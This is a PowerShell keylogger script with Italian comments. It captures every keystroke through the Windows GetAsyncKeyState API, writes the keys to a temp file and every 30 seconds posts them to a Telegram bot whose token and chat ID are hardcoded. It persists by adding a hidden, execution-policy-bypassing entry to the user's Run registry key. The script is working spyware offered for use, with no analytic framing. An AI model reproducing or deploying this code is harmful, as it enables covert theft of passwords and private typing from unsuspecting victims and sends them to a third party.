# Configurazione Telegram
$botToken = "7636235608:AAFheAZoLU3edoN2_0IRzgmfMOrWST7pilQ"  # Token del bot
$chatId = "6550700163"  # Chat ID
$apiURL = "https://api.telegram.org/bot$botToken/sendMessage"

# Percorso del file temporaneo per salvare i log
$tempFile = "$env:TEMP\keylogs.txt"

# Creazione del file temporaneo
if (-Not (Test-Path $tempFile)) {
    Write-Host "Creazione del file temporaneo: $tempFile"
    New-Item -Path $tempFile -ItemType File -Force | Out-Null
} else {
    Write-Host "File temporaneo già esistente: $tempFile"
}

# Funzione per catturare i tasti premuti
function Start-Keylogger {
    Write-Host "Start-Keylogger avviato"

    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardTracker {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static string LogKeys() {
        string keys = "";
        for (int i = 0; i < 255; i++) {
            int keyState = GetAsyncKeyState(i);
            if (keyState == 1 || keyState == -32767) {
                keys += ((Keys)i).ToString() + " ";
            }
        }
        return keys;
    }
}
"@
        Write-Host "Add-Type completato"
    } catch {
        Write-Host "Errore durante Add-Type: $_"
        return
    }

    while ($true) {
        Start-Sleep -Milliseconds 100  # Intervallo per ridurre il carico della CPU
        try {
            $keys = [KeyboardTracker]::LogKeys()
            if ($keys -ne "") {
                Add-Content -Path $tempFile -Value $keys
                Write-Host "Tasti registrati: $keys"
            }
        } catch {
            Write-Host "Errore durante la registrazione dei tasti: $_"
            Start-Sleep -Seconds 5
        }
    }
}

# Funzione per inviare i log a Telegram
function Send-Logs {
    Write-Host "Send-Logs avviato"
    while ($true) {
        Start-Sleep -Seconds 30
        try {
            if (Test-Path $tempFile) {
                $logs = Get-Content -Path $tempFile -Raw
                if ($logs -ne "") {
                    Write-Host "Tentativo di invio log a Telegram"
                    $body = @{
                        chat_id = $chatId
                        text = $logs
                    }
                    $response = Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
                    if ($response.StatusCode -eq 200) {
                        Write-Host "Log inviato con successo a Telegram"
                        Clear-Content -Path $tempFile
                    } else {
                        Write-Host "Errore durante l'invio, codice HTTP: $($response.StatusCode)"
                    }
                } else {
                    Write-Host "Nessun log da inviare"
                }
            } else {
                Write-Host "File log non trovato: $tempFile"
            }
        } catch {
            Write-Host "Errore durante l'invio a Telegram: $_"
            Start-Sleep -Seconds 10
        }
    }
}

# Persistenza: aggiungi il keylogger al registro di avvio
if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogger")) {
    Write-Host "Aggiunta del keylogger al registro di avvio"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keylogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath" | Out-Null
}

# Avvia il keylogger e l'invio dei log in background
Start-Job -ScriptBlock { Start-Keylogger }
Start-Job -ScriptBlock { Send-Logs }

